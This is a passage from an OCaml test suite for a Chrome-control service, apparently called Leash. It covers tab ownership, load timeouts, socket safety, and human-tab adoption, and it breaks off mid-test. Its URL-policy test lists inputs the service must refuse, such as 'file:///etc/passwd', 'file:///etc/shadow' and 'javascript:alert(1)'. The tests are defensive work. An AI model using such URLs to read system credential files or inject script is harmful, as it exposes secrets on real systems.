(* L3: chrome-qnul chrome-1yn9 chrome-akz4 chrome-2n8n chrome-hjw9
   chrome-fuao chrome-38a4 chrome-d4mz chrome-2z2z chrome-6lfk; L5: chrome-qnul (a [new]
   with a url waits for the load exactly as [nav] does, one without a url replies at once). *)
module P = Leash.Protocol
module Fake = Leash_test_support.Fake_browser
module Chrome = Leash.Chrome

let obj xs = `Assoc xs
let str s = `String s
let field key = function `Assoc xs -> List.assoc_opt key xs | _ -> None

let get key json =
  match field key json with Some x -> x | None -> Alcotest.fail ("missing " ^ key)

let owner text =
  match P.Owner.of_string text with Ok x -> x | Error e -> Alcotest.fail e

let tab json =
  match P.Handle.t_of_yojson (get "tab" json) with
  | Ok x -> x
  | Error e -> Alcotest.fail e

let code = function
  | P.Failure e -> P.Error_code.to_string e.code
  | _ -> Alcotest.fail "expected failure"

let result = function
  | P.Success json -> json
  | P.Failure e -> Alcotest.failf "%s: %s" (P.Error_code.to_string e.code) e.message

let request tabs who command =
  let wire = P.encode_request { owner = owner who; command } |> Yojson.Safe.to_string in
  match P.decode_reply (Yojson.Safe.from_string (Leash.Control.handle tabs wire)) with
  | Ok x -> x
  | Error e -> Alcotest.fail e

let check_code label expected reply = Alcotest.(check string) label expected (code reply)

let contains text sub =
  let rec search i =
    i + String.length sub <= String.length text
    && (String.sub text i (String.length sub) = sub || search (i + 1))
  in
  search 0

let rig ?reporter ?download_dir f =
  Ox_test.run (fun env sw ->
      let mgr = Ox_test.Process.make [ Block_until_signal; Block_until_signal ] in
      let current = ref None in
      let launch ~sw ~clock ~mgr:_ config =
        let fake, client = Fake.create ~sw () in
        current := Some fake;
        match
          Ox_process.Child.spawn ~caps:(Ox_test.powerbox ()) ~sw ~clock
            ~mgr:(Ox_test.Process.mgr mgr) ~argv:(Chrome.argv config)
            ~grace:(Ox.Duration.ms 50) ~fds:[] ()
        with
        | Error e -> Error e
        | Ok child -> Ok (child, { Leash.Cdp.read = client.read; write = client.write })
      in
      let logger =
        Ox_observability.Logger.create ~service:"leash-tests" ~clock:env#clock
          ~mono_clock:env#mono_clock
          ~reporter:
            (Option.value reporter
               ~default:(Ox_observability.Logger.Reporter.writer ignore))
          ()
      in
      let chrome =
        Chrome.create ~sw ~launch
          (Chrome.make ~binary:"/bin/sh" ~profile_dir:"/tmp/leash-test-profile"
             ~workspace:"test" ~headless:true ())
          {
            Chrome.clock = env#clock;
            mgr = env#process_mgr;
            logger;
            caps = (Ox_test.powerbox () :> Leash.Chrome.caps);
          }
      in
      let tabs =
        Leash.Tabs.create ~sw ~cap:2 ~tombstone_s:3600 ?download_dir
          {
            Leash.Tabs.chrome;
            clock = env#clock;
            logger;
            desktop = Leash.Desktop.disabled;
            caps = (Ox_test.powerbox () :> Leash.Tabs.caps);
          }
      in
      let rec ready n =
        if n = 0 then Alcotest.fail "no Chrome"
        else if (Chrome.status chrome).phase <> `Running then (
          Eio.Fiber.yield ();
          ready (n - 1))
      in
      ready 1000;
      let fake () = match !current with Some x -> x | None -> Alcotest.fail "no fake" in
      f env sw chrome tabs fake)

(* The Target.getTargetInfo reply the registry reads once a load is done: the document's
   title and committed URL, which real Chrome's pushed targetInfoChanged does not carry. *)
let document ~title ~url =
  obj
    [
      ( "targetInfo",
        obj
          [
            ("targetId", str "target-1");
            ("type", str "page");
            ("title", str title);
            ("url", str url);
          ] );
    ]

(* chrome-qnul: [new] with a url subscribes before Page.navigate and waits for the
   load event, so every test that creates such a tab has to answer it. The pushed title is Chrome's tab-strip title — the formatted
   URL ("example.com" for https://example.com/), see docs/cdp-shapes.md — and the document
   title only comes from the query above, made once the load is done. *)
let loads ?title fake =
  Fake.on_method fake "Page.navigate" (fun request ->
      let session =
        match get "sessionId" request with `String s -> s | _ -> assert false
      in
      Option.iter
        (fun title ->
          Fake.emit ~session fake ~method_:"Target.targetInfoChanged"
            ~params:
              (obj
                 [
                   ( "targetInfo",
                     obj
                       [
                         ("targetId", str "target-1");
                         ("type", str "page");
                         ("title", str title);
                         ("url", str "https://example.com");
                       ] );
                 ]))
        title;
      Fake.emit ~session fake ~method_:"Page.loadEventFired"
        ~params:(Fake.event "Page.loadEventFired");
      obj [])

let lifecycle () =
  rig (fun _ _ _ tabs fake ->
      loads (fake ());
      let info =
        result (request tabs "alice" (P.New { url = Some "https://example.com" }))
      in
      let h = tab info in
      Alcotest.(check bool)
        "chrome-qnul random handle" true
        (String.starts_with ~prefix:"t_" (P.Handle.to_string h));
      let mine =
        result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
      in
      let theirs =
        result (request tabs "bob" (P.List_tabs { all = false })) |> get "tabs"
      in
      Alcotest.(check int)
        "chrome-hjw9 mine" 1
        (match mine with `List xs -> List.length xs | _ -> 0);
      Alcotest.(check bool) "chrome-hjw9 isolation" true (theirs = `List []);
      let status = result (request tabs "alice" P.Status) in
      Alcotest.(check bool)
        "chrome-fuao generation and open" true
        (get "generation" status = `Int 1 && get "open" (get "tabs" status) = `Int 1);
      let methods =
        Fake.received (fake ())
        |> List.filter_map (fun j ->
            match field "method" j with Some (`String s) -> Some s | _ -> None)
      in
      Alcotest.(check bool) "attached" true (List.mem "Target.attachToTarget" methods);
      check_code "drive-ig84 owner" "not-owner"
        (request tabs "bob"
           (P.Drive
              {
                tab = Some h;
                mission = "Do a task";
                max_steps = None;
                start_url = None;
                max_procedures = None;
                expect = None;
                out = None;
                deadline_s = None;
                dry_run = Some true;
              }));
      Alcotest.(check int)
        "drive-8n2z denied before browser access" (List.length methods)
        (List.length (Fake.received (fake ())));
      check_code "owner" "not-owner"
        (request tabs "bob" (P.Close { tab = h; force = None }));
      ignore (result (request tabs "alice" (P.Close { tab = h; force = None })));
      ignore (result (request tabs "alice" (P.Close { tab = h; force = None })));
      Alcotest.(check bool)
        "chrome-2n8n closed" true
        (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0))

let safety () =
  rig (fun _ _ _ tabs _ ->
      List.iter
        (fun url ->
          check_code "chrome-akz4 policy" "url-refused"
            (request tabs "alice" (P.New { url = Some url })))
        [ "file:///etc/passwd"; "javascript:alert(1)"; "https://user:pw@example.com" ];
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      check_code "chrome-akz4 nav" "url-refused"
        (request tabs "alice" (P.Nav { tab = h; url = "file:///etc/shadow" }));
      ignore (result (request tabs "alice" (P.New { url = None })));
      check_code "chrome-d4mz cap" "tab-cap" (request tabs "alice" (P.New { url = None })))

let nav () =
  rig (fun _ _ _ tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      Fake.on_method (fake ()) "Page.navigate" (fun request ->
          let session =
            match get "sessionId" request with `String s -> s | _ -> assert false
          in
          Fake.emit ~session (fake ()) ~method_:"Page.frameNavigated"
            ~params:(Fake.event "Page.frameNavigated");
          Fake.emit ~session (fake ()) ~method_:"Page.domContentEventFired"
            ~params:(Fake.event "Page.domContentEventFired");
          obj [ ("frameId", str "frame-1"); ("loaderId", str "loader-2") ]);
      Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
          document ~title:"Example Domain" ~url:"https://example.com/next");
      let reply =
        result
          (request tabs "alice" (P.Nav { tab = h; url = "https://example.com/start" }))
      in
      let asked =
        Fake.received (fake ())
        |> List.find_map (fun json ->
            match field "method" json with
            | Some (`String "Page.navigate") -> (
                match field "params" json with
                | Some params -> Some (get "url" params)
                | None -> None)
            | _ -> None)
      in
      Alcotest.(check bool)
        "chrome-1yn9 navigates to the requested url" true
        (asked = Some (str "https://example.com/start"));
      Alcotest.(check bool)
        "chrome-1yn9 reports the committed url" true
        (get "url" reply = str "https://example.com/next");
      Alcotest.(check bool)
        "chrome-1yn9 title after load" true
        (get "title" reply = str "Example Domain"))

(* A request that waits for a load event nobody will send never settles. The suite bounds
   the wait with yields so a missing immediate reply fails rather than hangs: the mock
   clock never advances by itself, so no timeout can rescue a wait that should not exist. *)
let settle ~sw what f =
  let cell = ref None in
  Eio.Fiber.fork ~sw (fun () -> cell := Some (f ()));
  let rec loop n =
    match !cell with
    | Some value -> value
    | None ->
        if n = 0 then Alcotest.fail (what ^ " did not reply without a load event")
        else (
          Eio.Fiber.yield ();
          loop (n - 1))
  in
  loop 10_000

(* chrome-qnul: the title is only known once the document has loaded, so [new] waits for
   the load event exactly as [nav] does before it replies. *)
let new_waits () =
  rig (fun _ _ _ tabs fake ->
      loads ~title:"example.com" (fake ());
      Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
          document ~title:"Example Domain" ~url:"https://example.com/");
      let info =
        result (request tabs "alice" (P.New { url = Some "https://example.com" }))
      in
      Alcotest.(check bool)
        "chrome-qnul committed url" true
        (get "url" info = str "https://example.com/");
      Alcotest.(check bool)
        "chrome-qnul title after load" true
        (get "title" info = str "Example Domain");
      (* chrome-qnul: a fast local document may finish during Target.createTarget. *)
      let calls = Fake.received (fake ()) in
      let methods =
        List.filter_map
          (fun call ->
            match field "method" call with Some (`String name) -> Some name | _ -> None)
          calls
      in
      let index name =
        let rec go n = function
          | [] -> Alcotest.fail ("missing " ^ name)
          | x :: xs -> if x = name then n else go (n + 1) xs
        in
        go 0 methods
      in
      Alcotest.(check bool)
        "chrome-qnul subscribe before navigate" true
        (index "Page.enable" < index "Page.navigate");
      let creation =
        List.find
          (fun call -> field "method" call = Some (str "Target.createTarget"))
          calls
      in
      Alcotest.(check bool)
        "chrome-qnul initially blank" true
        (get "url" (get "params" creation) = str "about:blank"))

(* chrome-qnul: without a url there is nothing to await, so the reply must not wait for a
   load event — none is emitted here, and the mocked clock never moves. *)
let new_without_url () =
  rig (fun _ sw _ tabs _ ->
      let info =
        settle ~sw "chrome-qnul new without a url" (fun () ->
            request tabs "alice" (P.New { url = None }))
        |> result
      in
      Alcotest.(check bool)
        "chrome-qnul about:blank" true
        (get "url" info = str "about:blank");
      Alcotest.(check bool) "chrome-qnul empty title" true (get "title" info = str ""))

(* chrome-qnul, chrome-1yn9: one load event that never comes, one 30-second bound and one
   [timeout] for both commands. *)
let load_timeout () =
  rig (fun env sw _ tabs _ ->
      (* One second at a time: the CDP calls around a load answer within a step or two,
         so only the registry's own 30-second bound is still running when it expires. *)
      let after_deadline what f =
        let cell = ref None in
        Eio.Fiber.fork ~sw (fun () -> cell := Some (f ()));
        let rec settle_calls n =
          if n > 0 && !cell = None then (
            Eio.Fiber.yield ();
            settle_calls (n - 1))
        in
        settle_calls 100;
        let rec await n =
          match !cell with
          | Some reply -> reply
          | None ->
              if n = 0 then Alcotest.fail (what ^ " did not time out")
              else (
                Ox_test.advance env#clock (Ox.Duration.seconds 1);
                Eio.Fiber.yield ();
                await (n - 1))
        in
        await 60
      in
      let described = function
        | P.Failure error -> P.Error_code.to_string error.code ^ ": " ^ error.message
        | P.Success _ -> "ok"
      in
      let handle = result (request tabs "alice" (P.New { url = None })) |> tab in
      let nav =
        after_deadline "chrome-1yn9 nav" (fun () ->
            request tabs "alice"
              (P.Nav { tab = handle; url = "https://example.com/slow" }))
      in
      let created =
        after_deadline "chrome-qnul new" (fun () ->
            request tabs "alice" (P.New { url = Some "https://example.com/slow" }))
      in
      Alcotest.(check string)
        "chrome-1yn9 nav timeout" "timeout: navigation did not load within 30 seconds"
        (described nav);
      Alcotest.(check string)
        "chrome-qnul the same timeout as nav" (described nav) (described created))

(* chrome-qnul, chrome-1yn9, tab-0ohq: the listener must outlast the registry's own bounds
   -- a load's thirty seconds, and a trusted input's CDP deadline plus the probes after it
   -- or a slow page's reply never reaches the client and its connection just closes. *)
let budget () =
  let handle =
    match P.Handle.of_string "t_budget" with Ok h -> h | Error why -> Alcotest.fail why
  in
  let snapshot =
    match P.Snapshot_id.of_string "s_budget" with
    | Ok s -> s
    | Error why -> Alcotest.fail why
  in
  let ms command =
    match Leash.Control.budget (Ok P.{ owner = owner "alice"; command }) with
    | Some duration -> Ox.Duration.to_ms duration
    | None -> Alcotest.fail "no budget"
  in
  Alcotest.(check bool)
    "chrome-qnul new with a url outlasts the load wait" true
    (ms (P.New { url = Some "https://example.com" }) > 30_000);
  Alcotest.(check int) "chrome-qnul new without a url" 1_000 (ms (P.New { url = None }));
  Alcotest.(check int)
    "chrome-qnul new about:blank" 1_000
    (ms (P.New { url = Some "about:blank" }));
  Alcotest.(check bool)
    "chrome-1yn9 nav outlasts the load wait" true
    (ms (P.Nav { tab = handle; url = "https://example.com" }) > 30_000);
  Alcotest.(check bool)
    "tab-0ohq a row action outlasts the settlement deadline" true
    (ms (P.Click { tab = handle; snapshot; index = 1 }) > 30_000);
  (* L32 run-obtt: the margin covers the last expectation wait and a planner turn's
     correction call, so a run that stops at the planner still answers. *)
  Alcotest.(check int)
    "run-obtt a run outlasts its deadline by the planner's correction call" 975_000
    (ms
       (P.Drive
          {
            tab = Some handle;
            mission = "do the thing";
            max_steps = None;
            start_url = None;
            max_procedures = None;
            deadline_s = Some 900;
            dry_run = None;
            expect = None;
            out = None;
          }));
  Alcotest.(check int) "other commands keep one second" 1_000 (ms P.Status)

let malformed () =
  rig (fun _ _ _ tabs _ ->
      let reply =
        Yojson.Safe.from_string
          (Leash.Control.handle tabs
             {|{"v":1,"owner":"alice","cmd":"new","args":{"url":77}}|})
      in
      let error = get "error" reply in
      Alcotest.(check bool)
        "chrome-38a4 invalid and pointer" true
        (get "code" error = str "invalid-request"
        && String.contains (Yojson.Safe.to_string (get "message" error)) '.'))

let lost () =
  rig (fun _ _ chrome tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      Fake.drop (fake ());
      let rec await n =
        if n = 0 then Alcotest.fail "Chrome did not restart"
        else if (Chrome.status chrome).phase <> `Restarting then (
          Eio.Fiber.yield ();
          await (n - 1))
      in
      await 1000;
      let rec gone n =
        if n = 0 then Alcotest.fail "no tombstone"
        else
          match request tabs "alice" (P.Close { tab = h; force = None }) with
          | P.Failure e when P.Error_code.to_string e.code = "tab-gone" ->
              Alcotest.(check bool)
                "chrome-2z2z browser_lost" true
                (match e.detail with
                | Some j -> get "disposition" j = str "browser_lost"
                | None -> false)
          | _ ->
              Eio.Fiber.yield ();
              gone (n - 1)
      in
      gone 1000;
      check_code "chrome-6lfk restart" "browser-unavailable"
        (request tabs "alice" (P.New { url = None })))

let with_runtime f =
  let runtime = Filename.temp_file "leash-control-" "" in
  Unix.unlink runtime;
  Unix.mkdir runtime 0o700;
  Fun.protect
    ~finally:(fun () ->
      let dir = Filename.concat runtime "leash" in
      let unlink path = if Sys.file_exists path then Unix.unlink path in
      unlink (Filename.concat dir "control.sock");
      unlink (Filename.concat dir "control.sock.lock");
      if Sys.file_exists dir then Unix.rmdir dir;
      Unix.chmod runtime 0o700;
      Unix.rmdir runtime)
    (fun () -> f runtime)

(* svc-o4wt: the control socket is the configured path; these tests keep the default
   layout under their own runtime directory. *)
let socket runtime = Filename.concat (Filename.concat runtime "leash") "control.sock"

(* tab-x4v0: a text reply bigger than the listener old 64 KiB ceiling arrives whole
   over a real socket; the service answers instead of closing the connection. *)
let large_text_over_socket () =
  with_runtime (fun runtime ->
      rig (fun env sw _ tabs fake ->
          let h = result (request tabs "alice" (P.New { url = None })) |> tab in
          let big = String.make 70_000 'x' in
          Fake.on_method (fake ()) "Runtime.evaluate" (fun _ ->
              obj [ ("result", obj [ ("type", str "string"); ("value", str big) ]) ]);
          let _control =
            match
              Leash.Control.create ~sw ~path:(socket runtime)
                {
                  Leash.Control.tabs;
                  status_query = (fun () -> []);
                  models_status =
                    (fun () ->
                      Leash.Protocol.
                        {
                          configured = false;
                          jev_model = "unconfigured";
                          text_model = "";
                          systemone_endpoint = "";
                          chat_base_url = "";
                        });
                  fs = env#fs;
                  net = env#net;
                  clock = env#clock;
                  logger =
                    Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                      ~mono_clock:env#mono_clock
                      ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                      ();
                  caps = (Ox_test.powerbox () :> Leash.Control.caps);
                }
            with
            | Ok control -> control
            | Error _ -> Alcotest.fail "tab-x4v0 listener refused"
          in
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          let line =
            P.encode_request
              {
                owner = owner "alice";
                command = P.Text { tab = h; index = None; max_chars = None };
              }
            |> Yojson.Safe.to_string
          in
          Eio.Flow.copy_string (line ^ "\n") flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:1_048_576)
            |> Yojson.Safe.from_string
          in
          match P.decode_reply reply with
          | Error why -> Alcotest.fail why
          | Ok (P.Failure error) ->
              Alcotest.failf "%s: %s" (P.Error_code.to_string error.code) error.message
          | Ok (P.Success json) ->
              let text =
                match field "text" json with
                | Some (`String text) -> text
                | _ -> Alcotest.fail "tab-x4v0 no text in reply"
              in
              Alcotest.(check int)
                "tab-x4v0 the whole bounded text" 65_536 (String.length text);
              Alcotest.(check bool)
                "tab-x4v0 truncated" true
                (get "truncated" json = `Bool true)))

let socket () =
  with_runtime (fun runtime ->
      rig (fun env sw _ tabs _ ->
          let make () =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps = (Ox_test.powerbox () :> Leash.Control.caps);
              }
          in
          (match make () with
          | Ok _ -> ()
          | Error _ -> Alcotest.fail "private listener refused");
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          Alcotest.(check int)
            "chrome-fwnu private socket" 0
            ((Unix.lstat path).st_perm land 0o077);
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          Eio.Flow.copy_string {|{"v":1,"owner":"alice","cmd":"status","args":{}}
|} flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "real socket status reply" true
            (get "ok" reply = `Bool true);
          match make () with
          | Ok _ -> Alcotest.fail "chrome-fwnu replaced live listener"
          | Error _ -> ()));
  with_runtime (fun runtime ->
      rig (fun env sw _ tabs _ ->
          let dir = Filename.concat runtime "leash" in
          Unix.mkdir dir 0o700;
          let path = Filename.concat dir "control.sock" in
          let fd = Unix.openfile path [ Unix.O_CREAT; Unix.O_WRONLY ] 0o600 in
          Unix.close fd;
          let create () =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps = (Ox_test.powerbox () :> Leash.Control.caps);
              }
          in
          (match create () with
          | Ok _ -> Alcotest.fail "chrome-fwnu replaced a regular file"
          | Error _ -> ());
          Alcotest.(check bool)
            "regular file untouched" true
            ((Unix.lstat path).st_kind = Unix.S_REG)));
  with_runtime (fun runtime ->
      rig (fun env sw _ tabs _ ->
          let dir = Filename.concat runtime "leash" in
          Unix.mkdir dir 0o700;
          Unix.chmod dir 0o755;
          let result =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps = (Ox_test.powerbox () :> Leash.Control.caps);
              }
          in
          let verdict =
            match result with
            | Ok _ -> Alcotest.fail "chrome-fwnu accepted unsafe socket directory"
            | Error _ -> ()
          in
          Unix.chmod dir 0o700;
          verdict))

(* svc-5wm8: one socket path has one owner. A second listener on the same path is
   refused with [`Active_listener] and does not unlink the live socket, so the first
   instance keeps answering: the operator sees a refusal at boot instead of two
   services fighting over one Chrome profile. *)
let listener_error = function
  | `Invalid_policy why -> "Invalid_policy " ^ why
  | `Unsafe_runtime_dir -> "Unsafe_runtime_dir"
  | `Inaccessible_runtime_dir -> "Inaccessible_runtime_dir"
  | `Ownership_conflict why -> "Ownership_conflict " ^ why
  | `Active_listener -> "Active_listener"
  | `Lock_conflict -> "Lock_conflict"
  | `Lock_identity -> "Lock_identity"
  | `Probe_failed -> "Probe_failed"
  | `Bind_failed why -> "Bind_failed " ^ why

let second_instance () =
  with_runtime (fun runtime ->
      (* [socket] is the Alcotest case below, so take the path from the layout. *)
      let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
      rig (fun env sw _ tabs _ ->
          let create () =
            Leash.Control.create ~sw ~path
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps = (Ox_test.powerbox () :> Leash.Control.caps);
              }
          in
          (match create () with
          | Ok _ -> ()
          | Error error ->
              Alcotest.failf "svc-5wm8 the first listener was refused: %s"
                (listener_error error));
          (* The lock file is what stops a second instance before the socket probe, so
             the refusal is [`Lock_conflict]; [`Active_listener] is the same refusal seen
             when only a live socket is there. Either one is the story: no second owner. *)
          (match create () with
          | Ok _ -> Alcotest.fail "svc-5wm8 a second instance started on the owned socket"
          | Error `Lock_conflict | Error `Active_listener -> ()
          | Error error ->
              Alcotest.failf "svc-5wm8 expected a refusal, got %s" (listener_error error));
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          Eio.Flow.copy_string {|{"v":1,"owner":"alice","cmd":"status","args":{}}
|} flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "svc-5wm8 the first instance still answers after the refusal" true
            (get "ok" reply = `Bool true)))

let human () =
  rig (fun _ _ _ tabs fake ->
      let agent = result (request tabs "alice" (P.New { url = None })) |> tab in
      Fake.emit (fake ()) ~method_:"Target.attachedToTarget"
        ~params:
          (obj
             [
               ("sessionId", str "human-session");
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "human-target");
                     ("type", str "page");
                     ("url", str "https://human.example/");
                     ("title", str "human");
                   ] );
             ]);
      let rec await n =
        if n = 0 then Alcotest.fail "human tab not adopted"
        else
          match
            get "tabs" (result (request tabs "alice" (P.List_tabs { all = true })))
          with
          | `List [ _; _ ] -> ()
          | _ ->
              Eio.Fiber.yield ();
              await (n - 1)
      in
      await 1000;
      let human_tab =
        match get "tabs" (result (request tabs "alice" (P.List_tabs { all = true }))) with
        | `List xs -> (
            match List.find_opt (fun x -> get "origin" x = str "human") xs with
            | Some x -> tab x
            | None -> Alcotest.fail "human tab missing")
        | _ -> Alcotest.fail "tabs must be an array"
      in
      Fake.on_method (fake ()) "Runtime.evaluate" (fun _ ->
          obj
            [
              ( "result",
                obj
                  [
                    ("type", str "object");
                    ( "value",
                      obj
                        [
                          ("epoch", str "human-doc");
                          ("count", `Int 0);
                          ("width", `Int 800);
                          ("height", `Int 600);
                        ] );
                  ] );
            ]);
      (* own-jua9: a tab discovered from outside Leash appears unowned, so a client —
         the "human" owner here — claims it before it may observe it. *)
      ignore (result (request tabs "human" (P.Claim { tab = human_tab })));
      ignore
        (result
           (request tabs "human"
              (P.Snap { tab = human_tab; match_ = None; limit = None; offset = None })));
      Alcotest.(check bool)
        "tab-of0i adopted page installed" true
        (Fake.received (fake ())
        |> List.exists (fun x ->
            field "method" x = Some (str "Page.addScriptToEvaluateOnNewDocument")
            && field "sessionId" x = Some (str "human-session")));
      let before = Fake.received (fake ()) |> List.length in
      Leash.Tabs.stop tabs;
      let closed =
        Fake.received (fake ())
        |> List.filteri (fun i _ -> i >= before)
        |> List.filter (fun x -> field "method" x = Some (str "Target.closeTarget"))
      in
      Alcotest.(check int) "agent only closed, human retained" 1 (List.length closed);
      ignore agent)

(* Blank the accessible name Chrome computed from the placeholder: the shape a control
   whose name the author suppressed has, while its DOM attribute stays. *)
let nameless_placeholder ax =
  let blank (node : Yojson.Safe.t) (fields : (string * Yojson.Safe.t) list) =
    let name : Yojson.Safe.t =
      match field "name" node with
      | Some (`Assoc name) ->
          `Assoc
            (List.map (fun (k, v) -> if k = "value" then (k, str "") else (k, v)) name)
      | _ -> `Null
    in
    `Assoc (("name", name) :: List.remove_assoc "name" fields)
  in
  match field "nodes" ax with
  | Some (`List nodes) ->
      let nodes =
        List.map
          (fun (node : Yojson.Safe.t) ->
            match field "name" node with
            | Some (`Assoc name)
              when List.assoc_opt "value" name = Some (str "Search terms") -> (
                match node with `Assoc fields -> blank node fields | _ -> node)
            | _ -> node)
          nodes
      in
      obj [ ("nodes", `List nodes) ]
  | _ -> ax

(* tab-of0i tab-tmoc tab-1r34 tab-hyap tab-1rx9 tab-0vh8.
   AX and DOMSnapshot replies below are copied from headless Chrome 152, not invented. *)
let fixture name =
  let load path = Yojson.Safe.from_file path in
  try load ("fixtures/" ^ name) with Sys_error _ -> load ("test/fixtures/" ^ name)

let snapshot_fixture () = fixture "snapshot-chrome.json"

(* daily-9ggi: real Chrome 152 replies, private headless service, device scale 2. *)
let daily_snapshot () =
  List.iter
    (fun site ->
      rig (fun _ _ _ tabs fake ->
          let fake = fake () in
          let captured = get site (fixture "daily-snapshot-chrome.json") in
          Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" captured);
          Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" captured);
          Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" captured);
          let scroll_y = ref 0 in
          Fake.on_method fake "Runtime.evaluate" (fun _ ->
              obj
                [
                  ( "result",
                    obj
                      [
                        ( "value",
                          obj
                            [
                              ("epoch", str "daily-9ggi");
                              ("count", `Int 1);
                              ("width", `Int 1366);
                              ("height", `Int 813);
                              ("scrollY", `Int !scroll_y);
                              ("devicePixelRatio", `Int 2);
                            ] );
                      ] );
                ]);
          let tab = result (request tabs "alice" (P.New { url = None })) |> tab in
          let snap () =
            result
              (request tabs "alice"
                 (P.Snap { tab; match_ = None; limit = None; offset = None }))
          in
          let rows json = match get "rows" json with `List xs -> xs | _ -> [] in
          let observed = rows (snap ()) in
          let has role name =
            List.exists
              (fun row -> get "role" row = str role && get "name" row = str name)
              observed
          in
          if site = "httpbin" then (
            List.iter
              (fun (role, name) ->
                Alcotest.(check bool) ("daily-9ggi visible " ^ name) true (has role name))
              [
                ("textbox", "Preferred delivery time: ");
                ("textbox", "Delivery instructions: ");
                ("button", "Submit order");
              ];
            Alcotest.(check int)
              "daily-9ggi all thirteen form controls" 13
              (List.length
                 (List.filter (fun row -> get "role" row <> str "paragraph") observed));
            scroll_y := 650;
            Alcotest.(check int)
              "daily-9ggi device-scaled scroll clips the form" 0
              (List.length (rows (snap ()))))
          else (
            Alcotest.(check bool)
              "daily-9ggi Learn more remains actionable" true (has "link" "Learn more");
            let paragraphs =
              List.filter (fun row -> get "role" row = str "paragraph") observed
            in
            Alcotest.(check int)
              "daily-9ggi one row per language paragraph" 6 (List.length paragraphs);
            Alcotest.(check string)
              "daily-9ggi complete English text, not characters"
              "This domain is for use in documentation examples without needing \
               permission. This is not a service, avoid relying on it for testing and \
               monitoring purposes."
              (match paragraphs with
              | row :: _ -> ( match get "name" row with `String s -> s | _ -> "")
              | [] -> ""))))
    [ "httpbin"; "example" ]

let snapshot () =
  rig (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = snapshot_fixture () in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      let guard_reads = ref 0 in
      let mutating = ref false in
      let scroll_y = ref 0 in
      Fake.on_method fake "Runtime.evaluate" (fun _ ->
          incr guard_reads;
          let counter = if !mutating then !guard_reads else 1 in
          obj
            [
              ( "result",
                obj
                  [
                    ("type", str "object");
                    ( "value",
                      obj
                        [
                          ("epoch", str "document-1");
                          ("count", `Int counter);
                          ("width", `Int 800);
                          ("height", `Int 600);
                          ("scrollY", `Int !scroll_y);
                        ] );
                  ] );
            ]);
      let h = result (request tabs "alice" (P.New { url = None })) |> tab in
      let snap ?match_ ?limit ?offset () =
        result (request tabs "alice" (P.Snap { tab = h; match_; limit; offset }))
      in
      let first = snap () in
      Alcotest.(check bool) "tab-of0i settled" true (get "settled" first = `Bool true);
      Alcotest.(check int)
        "tab-tmoc visible rows" 2
        (get "total" first |> function `Int n -> n | _ -> -1);
      Alcotest.(check string)
        "tab-of0i reading order" "fresh doc"
        (match get "rows" first with
